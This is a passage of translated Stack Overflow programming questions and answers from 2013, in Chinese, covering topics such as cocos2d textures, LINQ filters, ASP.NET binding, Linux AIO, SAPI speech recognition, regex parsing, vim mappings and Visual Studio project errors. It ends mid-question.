# iphone - 连续切换精灵图像（不显示动画）

> ID：15879767
> 
> 赞同：0
> 
> 时间：2013-04-08T13:01:27.583
> 
> 标签：iphone, ios, xcode, cocos2d-iphone

使用下面的代码，我可以连续更改 CCSprite 的颜色，但我需要使用此代码更改我的 CCSprite 图像。我怎样才能做到这一点？

注意：不想只显示帧变化的动画，我需要选择稍后在我的代码中不断变化的精灵之一。

```
 id delayTime1 = [CCDelayTime actionWithDuration:0.05f];
    id calFun1   = [CCCallBlock actionWithBlock:^{
        //HERE SET BLUE TEXTURE..
       // m_spriteBubbleWeapon= [CCSprite spriteWithFile:[NSString stringWithFormat:@"firstimage.png"]];// //kill when i uncomment it 

        m_spriteBubbleWeapon.color = ccc3(255,0,255); // works current

    }];
    id delayTime2 = [CCDelayTime actionWithDuration:0.05f];
    id calFun2   = [CCCallBlock actionWithBlock:^{
        //HERE SET RED TEXTURE..
        //m_spriteBubbleWeapon= [CCSprite spriteWithFile:[NSString stringWithFormat:@"second image.png"]];//kill when i uncomment it

        m_spriteBubbleWeapon.color = ccc3(255,0,0);//work correct

    }];

    id sequece = [CCSequence actions:delayTime1, calFun1, delayTime2, calFun2, nil];
    id repeate = [CCRepeatForever actionWithAction:sequece];

    [sprite runAction:repeate]; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-08T14:58:55.307

在类的前面定义一个属性 tex1 和 tex2（例如在 init 中）：

```
CCTexture2D* tex1 = [[CCTextureCache sharedTextureCache] addImage:@"firstimage.png"];
CCTexture2D* tex2 = [[CCTextureCache sharedTextureCache] addImage:@"secondimage.png"]; 
```

然后在代码中将纹理替换为现有精灵：

```
id delayTime1 = [CCDelayTime actionWithDuration:0.05f];
id calFun1   = [CCCallBlock actionWithBlock:^{
    //HERE SET BLUE TEXTURE..
    [m_spriteBubbleWeapon setTexture:tex1];
    m_spriteBubbleWeapon.color = ccc3(255,0,255); // works current
}]; 
```

...

```
 //HERE SET RED TEXTURE..
    [m_spriteBubblWeapon setTexture:tex2]; 
```

# wordpress - 如何编辑就绪电子商务插件模板

> ID：15879770
> 
> 赞同：0
> 
> 时间：2013-04-08T13:01:36.177
> 
> 标签：wordpress

我用准备好了！我网站中的电子商务购物车插件。我想知道如何更改模板。我的意思是产品列表视图，单个产品视图......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T19:33:58.480

当然。尝试在插件文件夹中搜索原始默认模板文件： modules/products/views/tpl/productContent.php - 用于单个产品视图 modules/products/views/tpl/productCategoryContent.php - 用于列表产品视图此外，如果您使用标准模板 - 见插件文件夹：templates/standard/products/productContent.php templates/standard/products/productCategoryContent.php

问候，阿列克谢。

# c# - Linq 过滤器列表 它包含来自另一个列表的字符串值

> ID：15879771
> 
> 赞同：35
> 
> 时间：2013-04-08T13:01:38.943
> 
> 标签：c#, .net, linq, list, filtering

我有 2 个 List 对象（简化）：

```
var fileList = Directory.EnumerateFiles(baseSourceFolderStr, fileNameStartStr + "*", SearchOption.AllDirectories);

var filterList = new List<string>();
filterList.Add("ThisFolderName");
filterList.Add("ThatFolderName"); 
```

我想过滤 fileLst 以仅返回包含来自 filterList 的任何文件夹名称的文件。（我希望这是有道理的..）

我尝试了以下表达式，但这总是返回一个空列表。

```
var filteredFileList = fileList.Where(fl => fl.Any(x => filterList.Contains(x.ToString()))); 
```

我似乎无法理解为什么我什么也没得到，显然我错过了一些东西，但我不知道是什么。

[编辑]

好的，所以看起来我的问题应该更清楚，我试图在我的 fileList 中搜索文件，其中包含来自我的 filterList 的字符串值的子字符串。对于那些试图做类似事情的人，我已经在下面标记了答案。

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2013-04-08T13:05:03.130

它更容易：

```
fileList.Where(item => filterList.Contains(item)) 
```

如果您想要过滤的不是精确匹配而是“包含”，您可以使用以下表达式：

```
var t = fileList.Where(file => filterList.Any(folder => file.ToUpperInvariant().Contains(folder.ToUpperInvariant()))); 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-04-08T13:10:26.943

尝试以下操作：

```
var filteredFileSet = fileList.Where(item => filterList.Contains(item)); 
```

当您迭代**filteredFileSet**（参见[LINQ Execution](http://blogs.msdn.com/b/charlie/archive/2007/12/09/deferred-execution.aspx)）时，它将由一组IEnumberable 值组成。这基于 Where Operator 检查以确保**fileList**数据集中的项目包含在**filterList**集中。

由于**fileList**是一[组 IEnumerable 字符串值](http://msdn.microsoft.com/en-us/library/dd383458.aspx)，您可以将“ **item** ”值直接传递给 Contains 方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-08T13:11:33.167

你可以这样做

```
var filteredFileList = fileList.Where(fl => filterList.Contains(fl.ToString())); 
```

# asp.net - 从asp.net中选择html中的数据绑定选定项目

> ID：15879772
> 
> 赞同：0
> 
> 时间：2013-04-08T13:01:43.210
> 
> 标签：asp.net, data-binding, multi-select

我在 asp.net 中编码，并添加了 html 选择控件，如下所示。我还需要对一些要预先选择的值进行数据绑定，我该怎么做？

```
<select multiple="true" runat="server" id="SelectControlID" 
    datasource='<%# GetItems(Convert.ToInt64(DataBinder.Eval(Container.DataItem, "ID"))) %>' 
    datatextfield='LocationName' datavaluefield='LocationID'>
</select> 
```

请注意，我必须拥有 runat="Server" 因为我需要检索后面代码中的值。这意味着我不能执行以下形式的操作，因为 runat 服务器不允许这样做。

```
<asp:Repeater runat="server" DataSource='SOMETHING'>
    <ItemTemplate>
        <option <%# DataBinder.Eval(Container.DataItem, "SelectedHTML") %> 
                value='<%# DataBinder.Eval(Container.DataItem, "LocationID") %>'>
                <%# DataBinder.Eval(Container.DataItem, "LocationName") %>
        </option>
    </ItemTemplate>
</asp:Repeater> 
```

最后，我的要求是一个下拉菜单，它允许多选项目并能够对预选项目进行数据绑定并在服务器端检索其值。我尝试使用上面的 select html 控件并使用[jquery multiselect widget](http://www.erichynds.com/blog/jquery-ui-multiselect-widget "jquery 多选小部件")来执行此操作。请帮助我完成剩下的工作或提出一个简单的替代方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T16:09:07.727

我选择了 asp:repeater 选项并避免 runat="server" 而是这样做

```
Request.Form["SelectControlID"] 
```

这让我可以访问选定的值，同时还可以在数据绑定上设置预选值。

请记住还要在选择控件上设置名称属性和 id，以便能够从请求表单中找到它。

# windows-7 - 驱动程序无法启动？

> ID：15879775
> 
> 赞同：0
> 
> 时间：2013-04-08T13:01:52.130
> 
> 标签：windows-7, driver, wdk

我已经为 SSDT shadow hooking 创建了一个驱动程序。使用 wdk 在 Windows 7 环境中成功创建了驱动程序。每当我尝试使用 osrloader 启动驱动程序服务时，我都会遇到参数不正确或系统找不到指定文件的错误。我可以注册服务但我无法启动服务。我已验证 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XXXX 图像名称和路径是否正确。如何解决此错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-18T15:47:31.577

尝试禁用驱动程序签名。

您可以使用 bcdedit.exe 永久执行此操作，或者只需`F8`在计算机启动时按下并选择`Disable Driver Signature Enforcement`选项来测试它。

# linux - 我在 RedHat 中的 SIGEV_THREAD 的 aio_read 完成例程中收到“资源暂时不可用”

> ID：15879783
> 
> 赞同：2
> 
> 时间：2013-04-08T13:02:08.803
> 
> 标签：linux, linux-kernel, aio

这是我的设计；

1）初始化AIO控制块；

```
memset(&m_ReadBuffer, 0, sizeof(struct aiocb));
m_ReadBuffer.aio_fildes = dup(m_Socket);
m_ReadBuffer.aio_buf = NULL; /* Not yet */
m_ReadBuffer.aio_nbytes = 0;
m_ReadBuffer.aio_offset = 0;
m_ReadBuffer.aio_reqprio = 0;
m_ReadBuffer.aio_lio_opcode = LIO_READ;

m_ReadBuffer.aio_sigevent.sigev_notify = SIGEV_THREAD;
m_ReadBuffer.aio_sigevent.sigev_value.sival_ptr = (void *) this;
m_ReadBuffer.aio_sigevent.sigev_notify_function = OnReadFinished;
m_ReadBuffer.aio_sigevent.sigev_notify_attributes = NULL; 
```

2）然后触发异步读取操作；

```
int RetVal = aio_read(&m_ReadBuffer);

if (RetVal != 0)
    return false;
return true; 
```

3）这是我的完成例程；

```
static void OnReadFinished(sigval_t pArg)
{
    ClassX *pTransport = (ClassX *) pArg.sival_ptr;

    // aio_error returns 0 if the request completed successfully
    int dwError = aio_error(&pTransport->m_ReadBuffer);
    int32_t cbTransferred = 0;

    // Did the request completed successfully
    if (dwError == 0) {
        // Cool, request completed, get the final retrun value.
        cbTransferred = aio_return(&pTransport->m_ReadBuffer);
    }
    else {
        // the request NOT completed, resheduling the reading process..
        // ***HERE: I'm getting "Resource unavailable temporarily***
        if (false == aio_read(&m_ReadBuffer))
            return;
    }

    // ... some codes ..
    return;
} 
```

4）在AIO完成例程中，我在空闲时间反复收到“资源暂时不可用”，但是当对方发送一些东西时，我可以读取正确的数据。我认为Linux内核中存在错误。如果套接字中没有数据，则不应使用“资源暂时不可用”错误调用 AIO 完成例程。无谓地浪费时间。。

提前致谢

# c# - 当远程端点未连接时，期望 TCP 失败 C#

> ID：15879786
> 
> 赞同：0
> 
> 时间：2013-04-08T13:02:15.460
> 
> 标签：c#, sockets, networking

使用 .net 套接字。我正在尝试确定套接字是否已连接。如果远程端点未连接，我希望发送操作会失败。实际上，我在发送时没有收到异常，但发送仅在一段时间后成功通过，发送将失败。对此有什么解释吗？为了获得连接状态，我还能做什么？

基于此，我的代码非常简单

```
Int32 port = 13000;
TcpClient client = new TcpClient(server, port);

// Translate the passed message into ASCII and store it as a Byte array.
Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);         

// Get a client stream for reading and writing. 
```

// 流流 = client.GetStream();

```
NetworkStream stream = client.GetStream();

// Send the message to the connected TcpServer. 
stream.Write(data, 0, data.Length);

Console.WriteLine("Sent: {0}", message);         

// Receive the TcpServer.response.

// Buffer to store the response bytes.
data = new Byte[256];

// String to store the response ASCII representation.
String responseData = String.Empty;

// Read the first batch of the TcpServer response bytes.
Int32 bytes = stream.Read(data, 0, data.Length);
responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
Console.WriteLine("Received: {0}", responseData);         

// Close everything.
client.Close();    ` 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T00:28:41.163

TCP 中没有“连接状态”。检测断开连接的唯一可靠方法是尝试重复写入：最终断开连接将导致 ECONNRESET 或任何映射到您的编程语言的内容。您还应该在读取时使用读取超时，其值是最长请求的预期延迟的两倍，并将其视为断开的连接或至少是一个损坏的事务，但如果事务延迟变化很大，这是有问题的。

# mysql - WordPress主题开发中MySQL数据库的版本控制（SVN）（任何代码示例？）

> ID：15879797
> 
> 赞同：2
> 
> 时间：2013-04-08T13:02:43.180
> 
> 标签：mysql, database, wordpress, version-control, themes

*我们在 Dropbox(!) 上部署了一个 SVN 服务器，一切正常，但我正在寻找一个简单的教程

***问题 #1：如何*****与多个开发人员一起对主题开发的 WordPress 数据库进行版本控制**

主要任务：

*   **稳定**
*   **易于更新**
*   **分支、合并、差异冲突**

**我搜索了很多类似的主题，**

*   但他们中的许多人只是给出一个概述，而不是傻瓜教程
*   他们中很少有人展示如何准确地编写这些脚本。

* * *

所以这是三天研究的结果——将近 20 小时（！）

**问题#2：脚本（下）足以完成给定的任务（上）？或者我需要...**

*   我需要检查触发器、视图并剥离它们（如何？）
*   此代码提供 DDL 分离（模式和数据包括）？
*   长期稳定吗？

**更新.bat**

```
if exist TortoiseProc.exe goto work1
exit

:work1
rem call D:\xampp-themes\mysql_stop.bat
rem ping 192.0.2.2 -n 1 -w 3000 > nul
START TortoiseProc.exe /command:update /path:"D:\xampp-themes\htdocs\themes\wp-content\themes\theme1"
rem call D:\xampp-themes\mysql_start.bat
pause
if exist d:\xampp-themes\mysql\bin\mysql.exe goto work2
exit

:work2
d:\xampp-themes\mysql\bin\mysql.exe -u root --default-character-set=utf8 wordpress<"d:\xampp-themes\htdocs\themes\wp-content\themes\theme1\dbcreation.sql"
d:\xampp-themes\mysql\bin\mysql.exe -u root -D --default-character-set=utf8 wordpress<"d:\xampp-themes\htdocs\themes\wp-content\themes\theme1\dbase_data.sql"
rem call D:\xampp-themes\mysql_stop.bat

rem ping 192.0.2.2 -n 1 -w 3000 > nul
rem exit
pause 
```

**提交.bat**

```
if exist d:\xampp-themes\mysql\bin\mysqldump.exe goto work1
exit

:work1
d:\xampp-themes\mysql\bin\mysqldump.exe -u root --default-character-set=utf8 wordpress>"d:\xampp-themes\htdocs\themes\wp-content\themes\theme1\dbase_data.sql"
d:\xampp-themes\mysql\bin\mysqldump.exe -u root -d --default-character-set=utf8 wordpress>"d:\xampp-themes\htdocs\themes\wp-content\themes\theme1\dbase_structure.sql"
call D:\xampp-themes\mysql_stop.bat
rem ping 192.0.2.2 -n 1 -w 3000 > nul

if exist TortoiseProc.exe goto work2
exit

:work2
START TortoiseProc.exe /command:commit /path:"D:\xampp-themes\mysql\data"
START TortoiseProc.exe /command:commit /path:"D:\xampp-themes\htdocs\themes\wp-content\themes\theme1"
pause
call D:\xampp-themes\mysql_start.bat
rem exit 
```

上面显示的所有内容都可能很蹩脚，但无论如何：

* * *

**你能建议一个更好的方法吗？**

**眼镜：**

*   Dropbox 作为 Windows 环境中的服务器（不是 bash/linux 语法）
*   香草WordPress 3.5.1
*   XAMPP
*   带有 TortoiseSVN Windows 客户端的 SVN 或 Subversion

**请提供/编辑代码！提前致谢！**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T15:36:56.867

主要步骤：

1.  简单。不要使用 TortoiseProc，使用 CLI 客户端
2.  稳定。不要将 Dropbox 用作存储库（或 WC）媒体，请根据需要选择 SVN 托管
3.  可用性。阅读[Luqibase](http://www.liquibase.org/)作为数据库版本控制和重构引擎并开始使用它，采用工作流进行所需的更改

# silverlight - Windows Phone 中的动画按钮位置

> ID：15879801
> 
> 赞同：0
> 
> 时间：2013-04-08T13:02:48.353
> 
> 标签：silverlight, animation, windows-phone-8

我有一个有两个按钮的 Windows Phone 应用程序。我的应用程序的总体布局如下所示：

```
<Grid>
  <Grid.ColumnDefinitions>
    <ColumnDefinition Width="60" />
    <ColumnDefinition />
    <ColumnDefinition Width="60" />
  </Grid.ColumnDefinitions>

  <Grid x:Name="captionGrid" VerticalAlignment="Bottom" Grid.Column="1" Background="Transparent">                                
    <Border Background="#3D3D3D" Opacity="0.4" />
    <TextBlock Text="[Some Text Goes Here]" Foreground="White" TextWrapping="Wrap" />
  </Grid>

  <Button x:Name="previousButton" Click="previousButton_Click">
    <Button.Template>
      <ControlTemplate>
        <Grid Background="Transparent">
          <Border Background="#3D3D3D" Opacity="0.4" />
          <TextBlock Text="Prev." VerticalAlignment="Center" HorizontalAlignment="Center" Foreground="White" />
        </Grid>
      </ControlTemplate>
    </Button.Template>
  </Button>

  <Button x:Name="nextButton" Grid.Column="2" Click="nextButton_Click">
    <Button.Template>
      <ControlTemplate>
        <Grid>
          <Border Background="#3D3D3D" Opacity="0.4" />
          <TextBlock Text="Next" VerticalAlignment="Center" HorizontalAlignment="Center" Foreground="White" />
        </Grid>
      </ControlTemplate>
    </Button.Template>
  </Button>
</Grid> 
```

当用户单击屏幕上的按钮时，我想运行 Storyboard。该 Storyboard 需要做三件事： 1) 将 Prev 按钮向左滑动，使其不可见。2) 向右滑动 Next 按钮，使其不在视野范围内。和 3) 向下滑动标题网格，使其不在视野范围内。不过，我似乎无法为这三个元素的位置设置动画。Margin 是一种厚度，因此 Silverlight 不直接支持它。如果我使用 Canvas 作为背景元素，则并非所有内容都适合屏幕的宽度/高度。

有谁知道我该如何解决这个问题？如果是这样，怎么做？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:37:09.667

您可以使用 RenderTransform 属性来制作动画。请参阅：http: [//msdn.microsoft.com/en-us/library/cc189019%28v=vs.95%29.aspx](http://msdn.microsoft.com/en-us/library/cc189019%28v=vs.95%29.aspx)，标题为“动画转换”的部分

# python - Python：win32com.client.getevents("SAPI.SpSharedRecoContext") 返回无

> ID：15879802
> 
> 赞同：2
> 
> 时间：2013-04-08T13:02:48.713
> 
> 标签：python, com, python-2.7, pywin32, sapi

我下载了一段代码，展示了如何使用 Python 2.7.3 解释器在 Windows 7 上使用 Windows Speech API (SAPI 5.1)，并在我的系统上安装了 PyWin32 Build 218。一切都适用于代码：

```
from win32com.client import constants
import win32com.client
import pythoncom

"""Sample code for using the Microsoft Speech SDK 5.1 via COM in Python.
    Requires that the SDK be installed; it's a free download from
            http://microsoft.com/speech
    and that MakePy has been used on it (in PythonWin,
    select Tools | COM MakePy Utility | Microsoft Speech Object Library 5.1).

    After running this, then saying "One", "Two", "Three" or "Four" should
    display "You said One" etc on the console. The recognition can be a bit
    shaky at first until you've trained it (via the Speech entry in the Windows
    Control Panel."""
class SpeechRecognition:
    """ Initialize the speech recognition with the passed in list of words """
    def __init__(self, wordsToAdd):
        # For text-to-speech
        self.speaker = win32com.client.Dispatch("SAPI.SpVoice")
        # For speech recognition - first create a listener
        self.listener = win32com.client.Dispatch("SAPI.SpSharedRecognizer")
        # Then a recognition context
        self.context = self.listener.CreateRecoContext()
        # which has an associated grammar
        self.grammar = self.context.CreateGrammar()
        # Do not allow free word recognition - only command and control
        # recognizing the words in the grammar only
        self.grammar.DictationSetState(0)
        # Create a new rule for the grammar, that is top level (so it begins
        # a recognition) and dynamic (ie we can change it at runtime)
#         self.wordsRule = self.grammar.Rules.Add("wordsRule",constants.SRATopLevel + constants.SRADynamic, 0)

        # Clear the rule (not necessary first time, but if we're changing it
        # dynamically then it's useful)
#         self.wordsRule.Clear()
        self.wordsRule = self.grammar.Rules.Add("wordsRule",1)
        self.wordsRule.Clear()
        # And go through the list of words, adding each to the rule
        [ self.wordsRule.InitialState.AddWordTransition(None, word) for word in wordsToAdd ]
        # Set the wordsRule to be active
        self.grammar.Rules.Commit()
        self.grammar.CmdSetRuleState("wordsRule", 1)
        # Commit the changes to the grammar
        self.grammar.Rules.Commit()
        # And add an event handler that's called back when recognition occurs
        self.eventHandler = ContextEvents(self.context)
        # Announce we've started using speech synthesis
        self.say("Started successfully")
    """Speak a word or phrase"""
    def say(self, phrase):
        self.speaker.Speak(phrase)

"""The callback class that handles the events raised by the speech object.
    See "Automation | SpSharedRecoContext (Events)" in the MS Speech SDK
    online help for documentation of the other events supported. """
class ContextEvents(win32com.client.getevents("SAPI.SpSharedRecoContext")):
    """Called when a word/phrase is successfully recognized  -
        ie it is found in a currently open grammar with a sufficiently high
        confidence"""
    def OnRecognition(self, StreamNumber, StreamPosition, RecognitionType, Result):
        newResult = win32com.client.Dispatch(Result)
        print "You said: ",newResult.PhraseInfo.GetText()

if __name__=='__main__':
    wordsToAdd = [ "One", "Two", "Three", "Four" ]
    speechReco = SpeechRecognition(wordsToAdd)
    while 1:
        pythoncom.PumpWaitingMessages() 
```

但是我得到了这个异常： class ContextEvents(win32com.client.getevents("SAPI.SpSharedRecoContext")): TypeError: Error when calling the metaclass bases cannot create 'NoneType' instances

我确实在网上搜索过，我唯一想到的是： [TypeError: Error when calling the metaclass bases](http://andre.stechert.org/urwhatu/2005/03/typeerror_error.html)

这没有任何帮助，所以我进行了更多搜索，并对部分代码进行了一些调查，所以我发现 win32com.client.getevents("SAPI.SpSharedRecoContext") retuens None 因此当它被用作基类时，抛出异常。

所以有什么问题？我该如何解决这个问题？否则我可以使用任何其他方式使用 SAPI 5.1 进行语音识别吗？

注意：我知道 SpeechPy 项目，但我必须使用 Windows API。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-09-13T05:16:54.290

你忘了运行 MakePy。
如果你安装了 pyWin32，它也安装了 PythonWin。

打开 PythonWin 然后选择工具 | COM MakePy 实用程序 | Microsoft 语音对象库 5.4

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-22T19:11:13.377

我对 Python 一无所知，但我确实注意到您没有在上下文中设置任何事件兴趣，因此 SAPI 永远不会给您回电。您也没有启用上下文（通过 context.State）。

至少，你需要类似的东西

```
self.context.EventInterests = 16
self.context.State = 1
self.eventHandler = ContextEvents(self.context) 
```

告诉 SAPI 您对识别事件感兴趣，并启用上下文。

MSDN 上提供了[SAPI 事件](http://msdn.microsoft.com/en-us/library/ee125206%28v=vs.85%29.aspx)的完整列表

# asp.net-mvc - 获取日期选择器的日期并在下拉列表中使用

> ID：15879806
> 
> 赞同：0
> 
> 时间：2013-04-08T13:03:05.090
> 
> 标签：asp.net-mvc

我使用asp.net mvc2，我有一个表会话，每个会话都有一个确定好的日期，如果我选择一个数据日期选择器，下拉列表将由当天的会话填充，我为此在jquery中编写了一个函数，我构建了日期选择器并选择了一个日期，但下拉列表中没有显示会话

# python - Python：拆分包含括号和|的复杂字符串

> ID：15879810
> 
> 赞同：6
> 
> 时间：2013-04-08T13:03:22.337
> 
> 标签：python, regex, string, parsing

在测试文件中，我有表格中的记录

```
DATA(VALUE1|VALUE2||VALUE4) 
```

等等。

我想将此字符串拆分为两次，第一次产生“DATA”，第二次给出括号内的内容，在“|”处拆分。第二部分看起来微不足道，但到目前为止，我在第一部分的尝试是丑陋的。

我更倾向于正则表达式而不是解析，因为最终行非常简单。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-08T13:08:01.077

另一个建议：

```
>>> s = "DATA(VALUE1|VALUE2||VALUE4)"
>>> import re
>>> matches = re.findall("[^()]+", s)
>>> matches
['DATA', 'VALUE1|VALUE2||VALUE4']
>>> result = {matches[0]: matches[1].split("|")}
>>> result
{'DATA': ['VALUE1', 'VALUE2', '', 'VALUE4']} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-08T13:05:41.130

您可以通过以下方式一次性完成`re.split`：

```
In [10]: import re

In [11]: line = 'DATA(VALUE1|VALUE2||VALUE4)'

In [12]: re.split(r'[(|)]', line)
Out[12]: ['DATA', 'VALUE1', 'VALUE2', '', 'VALUE4', ''] 
```

并像这样提取数据和值：

```
In [13]: parts = re.split(r'[(|)]', line)

In [14]: data = parts[0]

In [15]: values = parts[1:-1]

In [16]: values
Out[16]: ['VALUE1', 'VALUE2', '', 'VALUE4'] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-08T13:08:52.827

```
import re
s = 'DATA(VALUE1|VALUE2|VALUE4)' 
```

然后

```
re.search(r"(.*)\((.*)\)", s).group(2).split("|") 
```

给你

```
['VALUE1', 'VALUE2', 'VALUE4'] 
```

和

```
re.search(r"(.*)\((.*)\)", s).group(1) 
```

给你

```
'DATA' 
```

# javascript - history.back() 在弹出窗口 IE 中不起作用

> ID：15879811
> 
> 赞同：2
> 
> 时间：2013-04-08T13:03:24.497
> 
> 标签：javascript, html, popup

我正在创建一个简单的电子邮件表单，用户单击一个按钮并打开一个弹出窗口，然后您可以通过表单进行。

现在我在那里放了一个后退按钮，它在 chrome 中工作。当您单击它时，它会返回到保留其所有数据的上一页。但是当我在 IE 中使用它时，它不起作用，这并不奇怪。但是，如果它不在 IE 的弹出窗口中，它确实可以工作。

那么这个弹出窗口有什么问题呢？

这是我用来打开窗口的代码，我开始认为缺少工具栏、后退和前进按钮等；是这个问题的原因。

```
 <input type=submit value="Get Quote" onclick="window.open('test_email1.html','mywindow','width=800,height=450','toolbar=yes', 'status=yes')"> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T19:47:12.837

浏览器确定它们如何填充浏览器历史记录中的页面字段。我知道 Firefox 经常记住和填充字段（并不总是可取的），而 IE 则没有那么多（也不总是可取的）。

如果您更喜欢特定的行为，您可能必须在服务器端实现它。

换句话说，使用您选择的服务器端语言（Java、PHP、.NET）来存储提交的数据。创建一个自定义后退按钮，该按钮请求预先填充保存数据的表单。

这可能比您希望的要复杂得多，但是除非您有能力强迫您的用户使用特定的浏览器，否则您将找不到仅客户端的解决方案。

# javascript - 如何在 JavaScript 中通过键为变量赋值

> ID：15879813
> 
> 赞同：0
> 
> 时间：2013-04-08T13:03:27.560
> 
> 标签：javascript, json, forms, variables

我有一个如下的 JSON 字符串：`{firstname: "foo", lastname: "bar", message: "I'm fubar" }` 并希望将每个值分配给一个与其相应键完全相同的变量：

我应该得到一个`var firstname`或对象`obj.firstname`来分配值“foo”，等等......

项目列表显然应该扩展，所以我不想硬编码键/变量名称来分配每个值。

完成这个非常简单的任务的好方法是什么？

是否存在一种 getElementById 类型的解决方案来为 key 标识的变量分配其各自的值？

这就是我正在尝试的，带有一些伪代码：

```
var firstname = "";
var lastname = "";
// etc...
var data = JSON.parse({firstname: "foo", lastname: "bar", message: "I'm fubar", age: "etc..."});

    for (var key in data) {

        ("the variable currently identified by the value of key").val(data[key]);
        // or any other way of assigning "foo" to firstname

        console.log("firstname: " + firstname + ", lastname: " + lastname);
    } 
```

然后打印

```
firstname: foo, lastname: bar 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:08:32.147

实际上，如果您在顶级范围内运行代码，则您正在将变量分配给窗口对象。

```
for (var key in data) {
    this[key] = data[key]; // Equivalent to window[key] here
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:05:57.670

如果要将其分配给具有这些值作为属性的对象，只需使用以下命令：

```
var obj = {firstname: "foo", lastname: "bar", message: "I'm fubar", age: "etc..."}; 
```

由于 JSON 是`JavaScript Object Notation`JavaScript 能够将此类数据解释为 JavaScript 对象。这允许您以某种方式访问​​属性`obj.firstname`等。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-08T13:06:39.600

您必须定义要“提取”密钥的范围。在这种情况下，您似乎可能想要引用全局范围：

```
for (var key in data) {
    window[key] = data[key];
} 
```

# vim - 替换模式下的 VIM“更改字”等效项

> ID：15879815
> 
> 赞同：1
> 
> 时间：2013-04-08T13:03:36.920
> 
> 标签：vim

我习惯了 vim 中的“更改对象”命令：cw、ci”等。

但是，有时我正在使用格式化的文本文件并希望保持间距。例如，在以下示例中

```
abc123  efg456 
```

我真的想要一个`rw`命令，当站在第一个`a`字符上并用 just 替换第一个单词时`ABC`，将`123`用空格替换字符。所以我会得到：

```
ABC     efg456 
```

（这是在`rwABC<esc>`光标最初打开`a`并处于命令模式时键入之后。

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-08T13:17:55.570

我会的`vwr<Space>RABC<Esc>`。这将应用运动/文本对象（此处`w`：）进行视觉选择，然后将选择空白，然后在其上启动*替换模式*。

您可以为此创建一个映射，但您的`rw`建议会阻止您使用原始`r`命令来替换单个字符（或者，如果您只是想要这个`w`动作，请不要用字母替换`w`）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T13:24:25.950

这是一个简单的映射（没有经过很好的测试，但它适用于您的示例）。它用空格替换到单词的末尾，并使您处于替换模式。

```
nnoremap <leader>rw ver <esc>R 
```

要使用它，请键入`\rw`。（您可以省略`<leader>`which 将允许您按`rw`要求键入，但这会干扰默认`r`行为。）

# asp.net - 错误：找不到此项目类型所基于的应用程序

> ID：15879816
> 
> 赞同：5
> 
> 时间：2013-04-08T13:03:38.123
> 
> 标签：asp.net, visual-studio-2012, visual-studio-lightswitch

我安装了 VS2012 并试图打开一个由另一个开发人员使用 VS2012 开发的项目。但我收到如下错误消息。我搜索了错误消息，发现大多数 MVC 项目都有相同的问题并找到了解决方案。但我的不是 MVC 项目。最初的开发者说它是一个 Light Switch 和 Entity Framework 项目。如何开始故障排除以找出我的计算机上缺少的内容并解决此问题？

![在此处输入图像描述](https://i.stack.imgur.com/O7GCg.jpg)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-01-20T17:53:23.313

这也发生在我身上。我错过了“Microsoft SQL Server 数据工具 - Visual Studio 2013 的商业智能”。下载后，我在转到 File -> New -> Project 时有其他商业智能项目类型，这是我以前没有的，并且我能够打开解决方案。

因此，当您转到 File -> New -> Project 时，可以比较您和您的开发人员朋友列出的项目类型。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-20T18:01:50.010

错误信息表明你的项目的扩展名是`.ls3proj`，这是 Visual Studio Lightswitch 使用的扩展名。

确保在安装 Visual Studio 2012（或更改/修复）时选择此产品。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-03-19T17:05:26.720

这可能不是同一个问题，但是在安装 VS2017 (Windows 7) 后尝试从 VS2013 命令提示符构建时，我遇到了类似的迁移错误。我的解决方案已经建立，所以应该没有错误。迁移错误似乎与 .NET 更改有关，可能是由于安装了更新版本的 Visual Studio。为我解决的问题是在关闭 Visual Studio 的所有打开实例后删除 C:\Users\your_user_name\AppData\Local\Microsoft\VisualStudio\12.0 （或您遇到问题的任何版本）中的 ComponentModelCache 文件夹。删除文件夹“应该”没有问题，因为它会在重新打开 VS 时重新创建。

ComponentModelCache 文件夹的问题显然会导致许多奇怪的问题：[http ://withmartin.net/how-visual-studios-component-model-cache-can-be-a-pain/](http://withmartin.net/how-visual-studios-component-model-cache-can-be-a-pain/)

# xcode - 获取符合键值编码的错误消息

> ID：15879823
> 
> 赞同：0
> 
> 时间：2013-04-08T13:04:06.093
> 
> 标签：xcode, ios6, core-location, cllocationmanager

我实际上正在设计一个简单的应用程序来利用核心位置来获取位置详细信息，同时显示纬度和经度。但是当我运行它时，我收到如下错误消息：

> 由于未捕获的异常“NSUnknownKeyException”而终止应用程序，原因：“[setValue:forUndefinedKey:]：此类与键 forLatitude 的键值编码不兼容。”

我也合成了属性。我仍然不知道为什么它会抛出错误的确切原因！

rajViewController.h

```
#import <UIKit/UIKit.h>
#import <CoreLocation/CoreLocation.h>
@interface rajViewController : UIViewController <CLLocationManagerDelegate>

@property (weak, nonatomic) IBOutlet UILabel *latitudeLabel;

@property (weak, nonatomic) IBOutlet UILabel *longitudeLabel;
